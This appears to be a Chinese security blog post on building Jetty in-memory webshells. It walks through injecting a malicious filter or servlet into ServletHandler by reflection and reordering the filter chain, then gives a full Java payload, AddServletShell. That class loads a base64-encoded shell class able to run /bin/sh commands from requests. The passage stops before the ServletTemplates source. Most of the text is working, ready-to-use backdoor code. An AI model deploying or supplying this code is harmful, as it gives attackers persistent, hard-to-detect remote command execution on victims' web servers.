<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>首先有个正常的servlet，给个断点看看调用栈。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1694696887638-ae17e8a7-daf5-4a62-80a5-cd4c4cbe9a4b.png#averageHue=%23474c51&clientId=u1838b34f-1126-4&from=paste&height=915&id=u2f5948c7&originHeight=1144&originWidth=2440&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2030170&status=done&style=none&taskId=u2926ed40-02a1-4cf0-b3cd-ed877ca08f0&title=&width=1952" alt="image.png"><br>可以发现有个ServletHandler，我们跟进看看他方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1694696959167-17ba8b33-9d31-4ae8-99e5-facb12c1c14f.png#averageHue=%234b5057&clientId=u1838b34f-1126-4&from=paste&height=514&id=ub45efe7f&originHeight=643&originWidth=2245&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1382195&status=done&style=none&taskId=u4b8339f0-b15b-4899-9646-dfef998bce3&title=&width=1796" alt="image.png"><br>它这有2个方法，addServeltWithMapping和addFilterwithMapping。我们这里需要添加的是Filter。所以思路就是先获取ServletHandler然后再反射调用该方法。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1694697236152-b7455fb5-21f8-49d6-bfaa-48ce406e900c.png#averageHue=%23595e66&clientId=u1838b34f-1126-4&from=paste&height=123&id=u8fe32ef7&originHeight=154&originWidth=1097&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=147780&status=done&style=none&taskId=u4d619de7-e7ae-432a-a0e2-cd43911e001&title=&width=877.6" alt="image.png"><br>该方法需要3个参数，恶意的filter，pathsec，dispatches，我们传入即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1694697525099-b32138d0-cb18-4653-824a-1102c9878a8b.png#averageHue=%2351555d&clientId=u1838b34f-1126-4&from=paste&height=590&id=u10c2522f&originHeight=738&originWidth=1541&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1006033&status=done&style=none&taskId=u5f0b0b50-03e0-4c1e-b48b-3acaf0cb406&title=&width=1232.8" alt="image.png"><br>进来后先加载了恶意Filter到classloader类加载器里去。<br>然后获取了ServletHandler，这里用到的工具也是之前说过的java-search-object<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1694697594487-9c3f456f-701a-409e-b3bb-cc136096b1f0.png#averageHue=%23474b55&clientId=u1838b34f-1126-4&from=paste&height=998&id=ud2b14520&originHeight=1248&originWidth=1954&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1821275&status=done&style=none&taskId=ub4c34140-6769-4a9d-af75-3d861e64738&title=&width=1563.2" alt="image.png"><br>最后就是注入Filter，也就是说的反射调用<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1694697647592-ba1d2f86-bb02-4552-852b-b661bc4d5ce3.png#averageHue=%23484d56&clientId=u1838b34f-1126-4&from=paste&height=809&id=u68cddca4&originHeight=1011&originWidth=1511&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1234514&status=done&style=none&taskId=u89d10ccd-a57a-4991-b2d6-663235733a3&title=&width=1208.8" alt="image.png"><br>在该方法内对_filters属性进行了修改<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1694697680130-44106d29-42ed-488b-bde5-6828b03b7b00.png#averageHue=%2351555c&clientId=u1838b34f-1126-4&from=paste&height=565&id=u8b72cf0b&originHeight=706&originWidth=1367&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=883806&status=done&style=none&taskId=u740c5f2d-3dbd-4836-a2b7-6237f651448&title=&width=1093.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1694697702116-3804c058-b680-426a-8d32-a7b2e0b7548d.png#averageHue=%23545860&clientId=u1838b34f-1126-4&from=paste&height=201&id=u87c38bd9&originHeight=251&originWidth=758&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=196380&status=done&style=none&taskId=u3bdb90f8-49b7-4c26-baf2-a9b91321025&title=&width=606.4" alt="image.png"><br>但是最后还需注意一个问题。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1694697725394-53f4aa84-263f-450a-b092-77c012e55042.png#averageHue=%23383e48&clientId=u1838b34f-1126-4&from=paste&height=244&id=u0af4f84b&originHeight=305&originWidth=972&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=221736&status=done&style=none&taskId=u77dee8e2-36be-4f3b-9a60-33c7f37a92f&title=&width=777.6" alt="image.png"><br>由于有一个内置的filter排在我们恶意添加的filter之前，因此我们需要手动排序一下，将恶意filter置于首位。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; Array.getLength(filterMaps); ++j) &#123;</span><br><span class="line">               <span class="type">Object</span> <span class="variable">filter</span> <span class="operator">=</span> Array.get(filterMaps, j);</span><br><span class="line">               <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> (String)GetField(filter, <span class="string">&quot;_filterName&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span> (filterName.contains(HFilter.getName())) &#123;</span><br><span class="line">                   tmpFilterMaps[<span class="number">0</span>] = filter;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   tmpFilterMaps[n] = filter;</span><br><span class="line">                   ++n;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; tmpFilterMaps.length; ++j) &#123;</span><br><span class="line">               Array.set(filterMaps, j, tmpFilterMaps[j]);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<p>这样当我们访问webshell的时候先触发的是内存马的filter。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1694697788020-6a235762-c347-45cf-8d66-7c4d23a8ed0f.png#averageHue=%234f535a&clientId=u1838b34f-1126-4&from=paste&height=650&id=ub4f593ca&originHeight=812&originWidth=1550&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1105307&status=done&style=none&taskId=u70308f2d-7930-45f0-a3f4-65ab3045a44&title=&width=1240" alt="image.png"><br>调用了<code>this.getFilter()</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1694697802264-d6ed451b-4bb3-4679-81ae-9a3a61424b01.png#averageHue=%23484d56&clientId=u1838b34f-1126-4&from=paste&height=57&id=u71bf7a01&originHeight=71&originWidth=374&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29072&status=done&style=none&taskId=u1d228195-7667-49f4-879e-13dcd5d560d&title=&width=299.2" alt="image.png"><br>返回了_filters<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1694697825262-d5e5d3d0-e444-4253-a8a2-ef9973f90041.png#averageHue=%233c4147&clientId=u1838b34f-1126-4&from=paste&height=135&id=ubade850a&originHeight=169&originWidth=734&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=103699&status=done&style=none&taskId=ub38873cf-7648-4367-9049-8da32687d0f&title=&width=587.2" alt="image.png"><br>然后就是进入该filter的dofilter进行命令执行。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1694697845240-96d74397-c4a2-4b63-baef-b0afbf12259d.png#averageHue=%23fcfcfc&clientId=u1838b34f-1126-4&from=paste&height=208&id=u972b7c74&originHeight=260&originWidth=1127&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7997&status=done&style=none&taskId=u1312bd24-5d48-4d16-86aa-73eb35fea35&title=&width=901.6" alt="image.png"></p>
<h1 id="Servlet内存马"><a href="#Servlet内存马" class="headerlink" title="Servlet内存马"></a>Servlet内存马</h1><p>Servlet其实也是一样的。我们刚刚提到有一个addServletMapping方法。</p>
<h2 id="内存马构造-1"><a href="#内存马构造-1" class="headerlink" title="内存马构造"></a>内存马构造</h2><p>这里就不进行调试直接给payload了，因为感觉都一模一样</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.memshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AddServletShell</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">servletHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;ServletTemplates&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterClassName</span> <span class="operator">=</span> <span class="string">&quot;com.boogipop.memshell.ServletTemplates&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">LoadServlet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">a</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, Integer.TYPE, Integer.TYPE);</span><br><span class="line">            a.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">byte</span>[] b = (<span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>()).decodeBuffer(<span class="string">&quot;yv66vgAAADIBFgoASAB2CQB3AHgIAHkKAHoAewgAfAsAfQB+CAB/CgANAIAKAIEAggoADQCDCQCEAIUIAIYHAIcIAIgIAIkIAFgIAIoHAIsKAIwAjQoAjACOCgCPAJAKABIAkQgAkgoAEgCTCgASAJQLAJUAlgoAlwB7CgCBAJgLAH0AmQsAfQCaCACbCgCBAJwLAH0AnQgAngsAnwCgCAChCgCiAKMHAKQHAKUKACcAdgsAnwCmCgAnAKcIAKgKACcAqQoAJwCqCgANAKsKACYArAoAogCtBwCuCgAxAHYLAH0ArwoAsACxCgAxALIKAKIAswcAtAoAQgC1CgA+ALYKADcAtwoANwC4CgA+ALkIALoHALsHALwHAL0KAD4AvgcAvwoAwADBBwDCCgBEAMMKAEcAxAcAxQcAxgEAAVUBAAxJbm5lckNsYXNzZXMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAKExjb20vYm9vZ2lwb3AvbWVtc2hlbGwvU2VydmxldFRlbXBsYXRlczsBAAZkb1Bvc3QBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAZyZXN1bHQBABJMamF2YS9sYW5nL1N0cmluZzsBAANjbWQBAAFrAQAGY2lwaGVyAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQAOZXZpbENsYXNzQnl0ZXMBAAJbQgEACWV2aWxDbGFzcwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAKZXZpbE9iamVjdAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEADHRhcmdldE1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAA1TdGFja01hcFRhYmxlBwCHBwBVBwDCAQAKRXhjZXB0aW9ucwcAxwEABWRvR2V0AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQAKU291cmNlRmlsZQEAFVNlcnZsZXRUZW1wbGF0ZXMuamF2YQwASwBMBwDIDADJAMoBAB5bK10gRHluYW1pYyBTZXJ2bGV0IHNheXMgaGVsbG8HAMsMAMwAzQEABHR5cGUHAM4MAM8A0AEABWJhc2ljDAC6ANEHANIMANMA1AwA1QDWBwDXDADYAFcBAAEvAQAQamF2YS9sYW5nL1N0cmluZwEABy9iaW4vc2gBAAItYwEAAi9DAQARamF2YS91dGlsL1NjYW5uZXIHANkMANoA2wwA3ADdBwDeDADfAOAMAEsA4QEAAlxBDADiAOMMAOQA1AcA5QwA5gDnBwDoDADpANQMAOkA0AwA6gDUAQAEUE9TVAwA6wDUDADsAO0BAAF1BwDuDADvAPABAANBRVMHAPEMAPIA8wEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwA9AD1DAD2APcBAAAMAPYA+AwA+QDUDAD6APsMAEsA/AwA/QD+AQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgwA/wEABwEBDAECANQMAQMBBAwBBQEGAQAoY29tL2Jvb2dpcG9wL21lbXNoZWxsL1NlcnZsZXRUZW1wbGF0ZXMkVQwBBwEIDAEJAQoMAEsBCwwBDAENDAEOAQ8BAAZlcXVhbHMBAA9qYXZhL2xhbmcvQ2xhc3MBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UMARABEQEAEGphdmEvbGFuZy9PYmplY3QHARIMARMBFAEAE2phdmEvbGFuZy9FeGNlcHRpb24MARUATAwAUgBTAQAmY29tL2Jvb2dpcG9wL21lbXNoZWxsL1NlcnZsZXRUZW1wbGF0ZXMBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAcY29tL2Jvb2dpcG9wL21lbXNoZWxsL0NvbmZpZwEAC2dldFBhc3N3b3JkAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAdpc0VtcHR5AQADKClaAQAMamF2YS9pby9GaWxlAQAJc2VwYXJhdG9yAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAlnZXRIZWFkZXIBAAlnZXRNZXRob2QBABZnZXRCZWhpbmRlclNoZWxsUHdkUHdkAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwBAAYoW0IpW0IBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAEIoTGNvbS9ib29naXBvcC9tZW1zaGVsbC9TZXJ2bGV0VGVtcGxhdGVzO0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAFnAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQAhAEcASAAAAAAABAABAEsATAABAE0AAAAvAAEAAQAAAAUqtwABsQAAAAIATgAAAAYAAQAAAA8ATwAAAAwAAQAAAAUAUABRAAAABABSAFMAAgBNAAACkgAHAAkAAAFqsgACEgO2AAQrEgW5AAYCAMYAiysSBbkABgIAEge2AAiZAHsruAAJuQAGAgBOLcYAai22AAqaAGMBOgSyAAsSDLYACJkAGga9AA1ZAxIOU1kEEg9TWQUtUzoEpwAXBr0ADVkDEhBTWQQSEVNZBS1TOgS7ABJZuAATGQS2ABS2ABW3ABYSF7YAGLYAGToFLLkAGgEAGQW2ABunANEruAAcuQAdAgDGAMUruQAeAQASH7YACJkAr7gAIE4ruQAhAQASIi25ACMDABIkuAAlOgQZBAW7ACZZuwAnWbcAKCu5ACEBABIiuQApAgC2ACoSK7YALLYALbYALhIktwAvtgAwGQS7ADFZtwAyK7kAMwEAtgA0tgA1tgA2OgW7ADdZKiq2ADi2ADm3ADoZBbYAOzoGGQa2ADw6BxkGEj0FvQA+WQMSP1NZBBJAU7YAQToIGQgZBwW9AEJZAytTWQQsU7YAQ1enAAhOLbYARbEAAQCnAWEBZABEAAMATgAAAGYAGQAAABIACAAUACMAFgAtABcAOAAYADsAGQBGABoAXQAcAHEAHgCNAB8AmAAhAKcAJAC1ACUAuQAmAMcAJwDOACgA/wApARkAKgEvACsBNgAsAU0ALQFhADEBZAAvAWUAMAFpADMATwAAAIQADQA7AF0AVABVAAQAjQALAFYAVwAFAC0AawBYAFcAAwC5AKgAWQBXAAMAzgCTAFoAWwAEARkASABcAF0ABQEvADIAXgBfAAYBNgArAGAAYQAHAU0AFABiAGMACAFlAAQAZABlAAMAAAFqAFAAUQAAAAABagBmAGcAAQAAAWoAaABpAAIAagAAABgAB/0AXQcAawcAbBP5ACYC+wDFQgcAbQQAbgAAAAQAAQBvAAQAcABTAAIATQAAAEkAAwADAAAAByorLLYARrEAAAACAE4AAAAKAAIAAAA3AAYAOABPAAAAIAADAAAABwBQAFEAAAAAAAcAZgBnAAEAAAAHAGgAaQACAG4AAAAEAAEAbwAJAHEAcgABAE0AAAArAAAAAQAAAAGxAAAAAgBOAAAABgABAAAAQgBPAAAADAABAAAAAQBzAFUAAAACAHQAAAACAHUASgAAAAoAAQA3AEcASQAA&quot;</span>);</span><br><span class="line">            a.invoke(Thread.currentThread().getContextClassLoader(), b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取上下文</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">GetWebContent</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">currentThread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> GetField(currentThread, <span class="string">&quot;contextClassLoader&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">_context</span> <span class="operator">=</span> GetField(contextClassLoader,<span class="string">&quot;_context&quot;</span>);</span><br><span class="line">            servletHandler = GetField(_context,<span class="string">&quot;_servletHandler&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">InjectServlet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span>(servletHandler != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//方法二</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">EvilServlet</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(filterClassName);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">addFilterWithMapping</span> <span class="operator">=</span> GetMethod(servletHandler, <span class="string">&quot;addServletWithMapping&quot;</span>, Class.class, String.class);</span><br><span class="line">            addFilterWithMapping.invoke(servletHandler, EvilServlet, <span class="string">&quot;/boogipop&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Object <span class="title function_">GetField</span><span class="params">(Object o, String k)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field f;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = o.getClass().getDeclaredField(k);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                f = o.getClass().getSuperclass().getDeclaredField(k);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e1)&#123;</span><br><span class="line">                f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(k);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> f.get(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Method <span class="title function_">GetMethod</span><span class="params">(Object obj, String methodName, Class&lt;?&gt;... paramClazz)</span> <span class="keyword">throws</span> NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                method = clazz.getDeclaredMethod(methodName, paramClazz);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (method == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(methodName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> method;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AddServletShell</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            LoadServlet();</span><br><span class="line">            GetWebContent();</span><br><span class="line">            InjectServlet();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">FilterBasedWithoutRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ServletTempaltes如下</p>
